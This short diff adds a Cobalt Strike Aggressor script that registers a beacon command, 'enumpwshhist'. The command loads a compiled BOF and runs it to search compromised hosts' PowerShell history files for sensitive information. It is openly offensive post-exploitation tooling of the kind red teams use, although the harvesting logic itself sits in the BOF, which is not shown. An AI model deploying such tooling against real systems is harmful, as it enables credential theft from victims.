@@ -1,0 +1,25 @@
+# author fyxme
+
+beacon_command_register(
+	"enumpwshhist", "Enumerate PowerShell history files and return sensitive information found",
+	"INFO:\nEnumerate Powershell history files and find sensitive information.\n\n" .
+	"USAGE:\nenumpwshhist\n\n");
+	
+alias enumpwshhist {
+	$bid = $1;
+
+	# Read in the right BOF file
+	$handle = openf(script_resource("./enumpwshhist.bof.o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid);
+
+	blog($bid, "Tasked to enumerate PowerShell history and find sensitive information");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+
+
